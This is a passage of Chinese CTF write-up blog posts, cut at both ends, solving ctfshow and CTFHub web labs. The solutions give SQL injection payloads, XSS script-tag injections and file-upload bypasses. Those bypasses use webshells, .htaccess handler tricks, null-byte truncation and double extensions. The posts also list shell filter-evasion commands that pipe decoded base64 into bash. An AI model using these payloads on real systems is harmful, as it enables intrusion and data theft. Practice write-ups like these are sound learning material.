class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span></span><br><span class="line"><span class="language-php">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span></span><br><span class="line"><span class="language-php">    <span class="comment"># 判断id的值是否大于999</span></span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$id</span>) &gt; <span class="number">999</span>)&#123;</span></span><br><span class="line"><span class="language-php">        <span class="comment"># id 大于 999 直接退出并返回错误</span></span></span><br><span class="line"><span class="language-php">        <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span></span><br><span class="line"><span class="language-php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="comment"># id 小于 999 拼接sql语句</span></span></span><br><span class="line"><span class="language-php">        <span class="variable">$sql</span> = <span class="string">&quot;select * from article where id = <span class="subst">$id</span> order by id limit 1 &quot;</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;执行的sql为：<span class="subst">$sql</span>&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">        <span class="comment"># 执行sql 语句</span></span></span><br><span class="line"><span class="language-php">        <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span></span><br><span class="line"><span class="language-php">        <span class="comment"># 判断有没有查询结果</span></span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="comment"># 如果有结果，获取结果对象的值$row</span></span></span><br><span class="line"><span class="language-php">            <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span></span><br><span class="line"><span class="language-php">                <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>]. <span class="string">&quot; - title: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;title&quot;</span>]. <span class="string">&quot; &lt;br&gt;&lt;hr&gt;&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;content&quot;</span>]. <span class="string">&quot;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">            &#125;</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="comment"># 关闭数据库连接</span></span></span><br><span class="line"><span class="language-php">        <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    </span></span><br><span class="line"><span class="language-php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="comment">&lt;!-- flag in id = 1000 --&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><blockquote><p>由于没有限制输入，所以只需要利用inval()的漏洞和sql注入漏洞拿到flag。</p><ol><li><p>?id=’1000‘       #字符串绕过 </p></li><li><p>?id=0x3e8      #转换成16进制绕过</p></li><li>?id=-1 or id=1000    </li><li>?id=100*10</li><li>?id=~~1000   #两次取反</li><li>?id=900%2B100      #%2B是+的url编码</li><li>?id=round(999.9) </li><li>?id=999 or 1=1 —+</li><li>?id=0b1111101000     #二进制</li><li>?id=125&lt;&lt;3</li><li>?id=1 union select * from article; —+</li><li>?id=/<em>!1000</em>/ 内联注释</li></ol><p>ctfshow{5853bd20-b1d4-420d-aa13-0c343c7e9461}</p></blockquote><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>ctf.show萌新计划web1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="comment"># 包含数据库连接文件</span></span></span><br><span class="line"><span class="language-php"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span></span><br><span class="line"><span class="language-php"><span class="comment"># 判断get提交的参数id是否存在</span></span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/or|\+/i&quot;</span>,<span class="variable">$id</span>))&#123;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="comment"># 判断id的值是否大于999</span></span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$id</span>) &gt; <span class="number">999</span>)&#123;</span></span><br><span class="line"><span class="language-php">        <span class="comment"># id 大于 999 直接退出并返回错误</span></span></span><br><span class="line"><span class="language-php">        <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span></span><br><span class="line"><span class="language-php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="comment"># id 小于 999 拼接sql语句</span></span></span><br><span class="line"><span class="language-php">        <span class="variable">$sql</span> = <span class="string">&quot;select * from article where id = <span class="subst">$id</span> order by id limit 1 &quot;</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;执行的sql为：<span class="subst">$sql</span>&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">        <span class="comment"># 执行sql 语句</span></span></span><br><span class="line"><span class="language-php">        <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span></span><br><span class="line"><span class="language-php">        <span class="comment"># 判断有没有查询结果</span></span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="comment"># 如果有结果，获取结果对象的值$row</span></span></span><br><span class="line"><span class="language-php">            <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span></span><br><span class="line"><span class="language-php">                <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>]. <span class="string">&quot; - title: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;title&quot;</span>]. <span class="string">&quot; &lt;br&gt;&lt;hr&gt;&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;content&quot;</span>]. <span class="string">&quot;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">            &#125;</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="comment"># 关闭数据库连接</span></span></span><br><span class="line"><span class="language-php">        <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    </span></span><br><span class="line"><span class="language-php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="comment">&lt;!-- flag in id = 1000 --&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span></span><br></pre></td></tr></table></figure><blockquote><p>多了一个过滤，不能用or, +号，上面筛选一下就行</p><p>?id=’1000’</p><p>ctfshow{622abd97-affc-4f13-9cb8-7181b9cc0ffa}</p></blockquote><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/or|\-|\\|\*|\&lt;|\&gt;|\!|x|hex|\+/i&quot;</span>,<span class="variable">$id</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><blockquote><p>依然是多了个过滤。?id=’1000’</p><p>ctfshow{560b6c4f-7a73-4d0d-96ae-cb941878bdc9}</p></blockquote><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/or|\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i&quot;</span>,<span class="variable">$id</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><blockquote><p>?id=’1000’</p><p>ctfshow{3390706c-7566-466c-a86e-37a6d19f95cc}</p></blockquote><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHub技能树-XSS</title>
      <link href="/posts/57dd66d8.html"/>
      <url>/posts/57dd66d8.html</url>
      
        <content type="html"><![CDATA[<h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><p>打开网站</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9bb879732317d8055c0970fba4a32d29.png" alt="img"></p><p>反射型，直接使用xss平台，将生成的地址传入第一个空</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191232646.png" alt="image-20241128191232646"></p><p>然后将url代码传入第二个空就行</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191309973.png" alt="image-20241128191309973"></p><p>flag=ctfhub{a51bb55f89d068a011466d62}</p><h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><p>打开网站，依然像上面的步骤一样。</p><p>区别于前面反射型xss的是，他建立恶意连接是在于每一次都要发送含恶意代码，而这个存储xss不需要，一旦发送过一次，以后每次访问它时，都会含有恶意代码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128215208090.png" alt="image-20241128215208090"></p><blockquote><p>flag=ctfhub{1cef0cbbc0bb33244d4a5c76}</p></blockquote><h2 id="DOM反射"><a href="#DOM反射" class="headerlink" title="DOM反射"></a>DOM反射</h2><p>查看源码位置</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128215659407.png" alt="image-20241128215659407"></p><p>需要闭合前面的 ‘  ，所以只需要在xss注入时前面加上’; ，然后把后面的’;注释掉。</p><p>由于前面没有东西了，所以</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>= &gt;</span></span><br></pre></td></tr></table></figure><p>其余步骤一样</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128220249060.png" alt="image-20241128220249060"></p><blockquote><p>flag=ctfhub{aebf8f6244f0ad340612cc6e}</p></blockquote><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>步骤一样，空格可以用[/]或者/**/代替</p><blockquote><p>flag=ctfhub{9830f9e82cfbc1e77a1d0dae}</p></blockquote><h2 id="过滤关键词"><a href="#过滤关键词" class="headerlink" title="过滤关键词"></a>过滤关键词</h2><p>先用探针试试</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128230131380.png" alt="image-20241128230131380"></p><p>发现没有</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">script</span></span><br></pre></td></tr></table></figure><p>所以是过滤了关键字script，可以使用大小写绕过，用sCRiPt</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128230522782.png" alt="image-20241128230522782"></p><blockquote><p>flag=ctfhub{9f0740745ba9e7b754658614}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHub技能树-文件上传</title>
      <link href="/posts/2f3e3730.html"/>
      <url>/posts/2f3e3730.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><blockquote><p>来源：CTFHub技能树</p></blockquote><h4 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h4><blockquote><p>直接上传一句话木马，会显示路径，直接蚁剑连接找到flag。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109112713829.png" alt="image-20241109112713829"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109112741306.png" alt="image-20241109112741306"></p><h4 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109112850962.png" alt="image-20241109112850962"></p><blockquote><p>查看源代码，发现进行了前端验证，必须是jpg,png或者gif文件。</p><p>直接抓包改包发送绕过</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109113155795.png" alt="image-20241109113155795"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109113230322.png" alt="image-20241109113230322"></p><blockquote><p>上传成功，直接蚁剑连接找flag就行。</p></blockquote><h4 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h4><blockquote><p>知识：htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p><p>介绍：hatccess文件，.htaccess是Apache的又一特色。<br>● 一般来说，配置文件的作用范围都是全局的，但Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件——.htaccess（分布式配置文件），<br>● 提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。<br>● 作为用户，所能使用的命令受到限制。<br>● 简单来说，就是我上传了一个.htaccess文件到服务器，那么服务器之后就会将特定格式的文件以php格式解析。</p><p>所以先创建一个 .htaccess的文件，里面输入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;pass777&quot;</span>&gt;</span></span><br><span class="line"><span class="attribute">SetHandler</span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure><p>表示文件名中包含pass777的文件都会被当作php执行</p><p>所以再写一个一句话木马，文件名中包含pass777，上传后用蚁剑连接就能拿到flag</p><p>ctfhub{2428d2cef017f7d0e902eaac}</p></blockquote><h4 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h4><blockquote><p>直接将一句话木马后缀改成jpg，然后抓包修改成php，蚁剑连接就能拿到</p><p>ctfhub{c76881cacfd16db8afee74fd}</p></blockquote><h4 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241120203556473.png" alt="image-20241120203556473"></p><blockquote><p>根据前端提示，发现上传类型限制成了jpg,png,gif文件，并且如果文件类型被允许，构造目标路径（<code>$des</code>），该路径由<code>$_GET[&#39;road&#39;]</code>（从URL的查询字符串中获取），一个随机数（10到99之间），当前日期和时间（格式为<code>YmdHis</code>），以及文件扩展名组成，并使用<code>move_uploaded_file()</code>函数将上传的文件从临时目录移动到目标目录（<code>$des</code>）</p><p>所以在路径处修改成.php的路径，然后用%00截断，让后面添加的目录失效</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241120204749984.png" alt="image-20241120204749984"></p><blockquote><p>由于我们修改了路径，所以保存路径就是原来的/upload/yjh-cmd.php</p><p>蚁剑连接challenge-a074b1b840a3ecbe.sandbox.ctfhub.com:10800/upload/123.php</p><p>ctfhub{e158c8b8eb6fdb23553ce830}</p></blockquote><h4 id="双写后缀"><a href="#双写后缀" class="headerlink" title="双写后缀"></a>双写后缀</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">name = <span class="built_in">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">blacklist = array(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php4&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;phtml&quot;</span>, <span class="string">&quot;pht&quot;</span>, <span class="string">&quot;jsp&quot;</span>, <span class="string">&quot;jspa&quot;</span>, <span class="string">&quot;jspx&quot;</span>, <span class="string">&quot;jsw&quot;</span>, <span class="string">&quot;jsv&quot;</span>, <span class="string">&quot;jspf&quot;</span>, <span class="string">&quot;jtml&quot;</span>, <span class="string">&quot;asp&quot;</span>, <span class="string">&quot;aspx&quot;</span>, <span class="string">&quot;asa&quot;</span>, <span class="string">&quot;asax&quot;</span>, <span class="string">&quot;ascx&quot;</span>, <span class="string">&quot;ashx&quot;</span>, <span class="string">&quot;asmx&quot;</span>, <span class="string">&quot;cer&quot;</span>, <span class="string">&quot;swf&quot;</span>, <span class="string">&quot;htaccess&quot;</span>, <span class="string">&quot;ini&quot;</span>);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">name = str_ireplace(<span class="variable">$blacklist</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$name</span>);</span></span><br><span class="line"><span class="meta prompt_">--&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>看提示发现过滤了一系列后缀，然后会把后缀替换成无，所以双写绕过,如：yjh.pphphp</p><p>ctfhub{a0a5473d07fac34189262488}</p></blockquote><h4 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h4><blockquote><p>先随便上传一个文件，然后有提示</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241120211213870.png" alt="image-20241120211213870"></p><blockquote><p>那就抓包修改文件类型,同时在一句话木马前加上GIF89a,用来表示这是一个图片</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241120211402688.png" alt="image-20241120211402688"></p><blockquote><p>蚁剑连接得到flag</p><p>ctfhub{5602bccd8ab06a8c2408fb81}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行过滤关键字</title>
      <link href="/posts/d36c6b6d.html"/>
      <url>/posts/d36c6b6d.html</url>
      
        <content type="html"><![CDATA[<h2 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5415034b6a6c6d525395ede652e55b0f.png" alt=""></p><p>反斜杠绕过  <code>ca\t y1n\g.php</code><br>两个单引号绕过  <code>cat y1&#39;&#39;ng.php</code><br>base64编码绕过 <code>echo “base64编码” | base64 -d | bash</code><br>hex编码绕过 <code>echo &quot;hex编码&quot; | xxd -r -p | bash</code><br>用[ ]进行匹配  <code>cat y1[n]g.php</code><br>用<em> 匹配任意 `cat y1n</em><code>用?匹配任意</code>cat y1n?<code>用&#123; &#125;匹配范围</code>cat y1{a..z}g.php<code>变量</code>$a=fl;$b=ag;cat $a$b.php<code>拼接绕过</code>‘fl’.’ag’`</p><p>括号绕过 (sy.(st).em)(ls);</p><p>除了上述方式，还可以用字符串拼接的方式绕过。</p><p>python字符串拼接:<br>1.+       eg: ‘a’+’b’     输出:’ab’<br>2.贴贴    eg: ‘a’’b’       输出:’ab’</p><p>PHP拼接:<br>.    eg: ‘a’.’b’      输出:’ab’</p><p>解释内联执行：将前一个执行结果作为后一个执行的参数。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ede76d59480f5f8a630234a9b9262bfd.jpg" alt=""></p><h2 id="过滤所有字母和数字"><a href="#过滤所有字母和数字" class="headerlink" title="过滤所有字母和数字:"></a>过滤所有字母和数字:</h2><p>1.位运算-异或（见脚本）<br>2.取反（见脚本）</p><p>3.短标签</p><p>一个字符串，将它用括号括起来，后面再跟一个括号，就会调用同名的函数。</p><p>eg:(“system”)();  其实就等于执行  system();</p><p>eg:(“system”)(“ls”);  其实就等于执行  system(“ls”);</p><p>将 system 等字符串用位运算进行编码，可以绕过许多过滤。<br>注意: 编码后不用””，样式是 (编码)();</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/QQ%E5%9B%BE%E7%89%8720240807145304.png" alt=""></p><h2 id="使用include函数包含绕过："><a href="#使用include函数包含绕过：" class="headerlink" title="使用include函数包含绕过："></a>使用include函数包含绕过：</h2><p>?c=include%0a$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</p><h2 id="嵌套绕过："><a href="#嵌套绕过：" class="headerlink" title="嵌套绕过："></a>嵌套绕过：</h2><p>?c=eval($_GET[1]);$1=phpinfo();</p><p>若能执行，变量$1就不再受过滤限制</p><h2 id="积累："><a href="#积累：" class="headerlink" title="积累："></a>积累：</h2><ol><li><p>过滤/，如 ls /用不了，可以使用ls -al，然后命令联合执行</p></li><li><p>%0a是回车符的url编码，有时候过滤了;&amp;|可以使用，但是注意，最好在浏览器url栏直接使用，或者使用hackbar，在题目的输入框使用可能没有效果。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HUBUCTF-2022-新生赛-wp</title>
      <link href="/posts/1f67230d.html"/>
      <url>/posts/1f67230d.html</url>
      
        <content type="html"><![CDATA[<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><blockquote><p>考点：反序列化，弱比较，php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$username</span>  = <span class="string">&quot;this_is_secret&quot;</span>; </span><br><span class="line"><span class="variable">$password</span>  = <span class="string">&quot;this_is_not_known_to_you&quot;</span>; </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="comment">//here I changed those two </span></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])? <span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line"><span class="variable">$data_unserialize</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$info</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data_unserialize</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="variable">$username</span>&amp;&amp;<span class="variable">$data_unserialize</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;username or password error!&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码审计，只需要传入的info的username和password值与变量的值弱比较。</p><p>这里很容易想到相等（强比较），但是其实是弱比较，而且根据提示可以知道这两个变量的值会改变，所以我们不知道确切的值，直接构造赋值0和1，最后发现0和0成功了，所以这两个变量改变了后还是字符串</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129191723974.png" alt="image-20241129191723974"></p><blockquote><p> NSSCTF{29cf034a-9052-4aec-b776-b1c8b18b82f5}</p></blockquote><h2 id="HowToGetShell"><a href="#HowToGetShell" class="headerlink" title="HowToGetShell"></a>HowToGetShell</h2><blockquote><p>考点：无字母rce，php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span 